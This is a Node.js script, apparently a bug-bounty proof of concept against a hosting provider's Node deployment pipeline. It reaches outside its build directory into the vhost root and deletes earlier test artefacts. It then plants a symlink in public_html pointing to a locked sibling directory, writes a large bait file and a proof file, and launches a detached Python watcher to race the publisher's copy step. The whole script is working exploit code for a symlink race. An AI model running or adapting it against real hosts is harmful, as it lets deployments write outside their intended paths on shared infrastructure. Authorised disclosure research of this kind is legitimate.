import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";

const marker = "HOSTINGER_NODE_DESTLINK_RUNTIME_RACE:r254r";
const nonce = "bugbounty-DESTLINK-RACE-20261126-r254r-64ac9e2b";
const name = "h1-destlink-race-r254r";
const output = path.resolve("dist");
const vhostRoot = path.resolve(process.cwd(), "../../..");
const publicRoot = path.join(vhostRoot, "public_html");
const sibling = path.join(vhostRoot, "h1-destlink-race-target-r254r");
const destination = path.join(publicRoot, name);
const alternate = path.join(publicRoot, ".h1-destlink-race-swap-r254r");
const watcherLog = path.join(os.homedir(), ".h1-r254r-dest-race-watcher.log");
const oldSibling = path.join(vhostRoot, "h1-destlink-race-target-r254p");
const oldSiblingQ = path.join(vhostRoot, "h1-destlink-race-target-r254q");

function removeExact(target) {
  try {
    const st = fs.lstatSync(target);
    if (st.isSymbolicLink() || !st.isDirectory()) fs.unlinkSync(target);
    else fs.rmSync(target, { recursive: true, force: true });
  } catch (error) {
    if (error.code !== "ENOENT") throw error;
  }
}

try { fs.chmodSync(oldSibling, 0o700); } catch (error) { if (error.code !== "ENOENT") throw error; }
removeExact(oldSibling);
try { fs.chmodSync(oldSiblingQ, 0o700); } catch (error) { if (error.code !== "ENOENT") throw error; }
removeExact(oldSiblingQ);
for (const oldPath of [
  path.join(os.homedir(), ".h1-r254p-dest-race-trace.json"),
  path.join(os.homedir(), ".h1-r254q-dest-race-trace.json"),
  path.join(os.homedir(), ".h1-r254q-dest-race-watcher.log"),
  watcherLog,
]) removeExact(oldPath);
removeExact(output);
removeExact(destination);
removeExact(alternate);
removeExact(sibling);

fs.mkdirSync(path.join(output, name), { recursive: true });
fs.writeFileSync(path.join(output, "index.html"), `<pre>${marker}</pre>\n`, { mode: 0o600 });
fs.writeFileSync(path.join(output, name, "000-bait.bin"), Buffer.alloc(8 * 1024 * 1024, 0x41), { mode: 0o600 });
fs.writeFileSync(path.join(output, name, "999-proof.txt"), `${nonce}:PUBLISHER-WROTE\n`, { mode: 0o600 });

fs.mkdirSync(sibling, { recursive: false, mode: 0o700 });
fs.chmodSync(sibling, 0o500);
fs.symlinkSync(sibling, alternate, "dir");

const watcherFd = fs.openSync(watcherLog, "a", 0o600);
const watcher = spawn("python3", ["destlink-race.py"], {
  cwd: process.cwd(),
  detached: true,
  stdio: ["ignore", watcherFd, watcherFd],
});
watcher.unref();
fs.closeSync(watcherFd);
const pythonVersion = spawnSync("python3", ["--version"], { encoding: "utf8" });

console.log(JSON.stringify({
  marker,
  nonce,
  destinationAbsent: !fs.existsSync(destination),
  alternateIsSymlink: fs.lstatSync(alternate).isSymbolicLink(),
  siblingMode: fs.statSync(sibling).mode & 0o7777,
  watcherStarted: Number.isInteger(watcher.pid),
  pythonVersion: `${pythonVersion.stdout ?? ""}${pythonVersion.stderr ?? ""}`.trim(),
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
